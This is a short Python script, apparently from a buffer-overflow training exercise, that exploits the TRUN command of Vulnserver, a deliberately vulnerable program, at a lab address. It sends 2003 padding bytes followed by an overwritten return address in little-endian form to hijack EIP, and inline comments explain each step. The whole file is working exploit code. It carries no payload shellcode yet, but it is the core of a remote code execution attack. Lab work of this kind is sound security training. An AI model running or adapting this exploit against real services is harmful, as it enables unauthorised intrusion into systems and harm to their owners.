#!/usr/bin/python
import sys, socket

# Return address is 0x625011af

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" #overwrite everything with A's(41), except for the EIP, we overwrite it with the return address we got. Since we deal with x86 architecture here, we have to use little endian format.

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.20', 9999)) #IP of the windows machine running Vulnserver and port number
        s.send(('TRUN /.:/' + shellcode))
        s.close()
                        
except:
        print "Error connecting to the server!!"
        sys.exit()    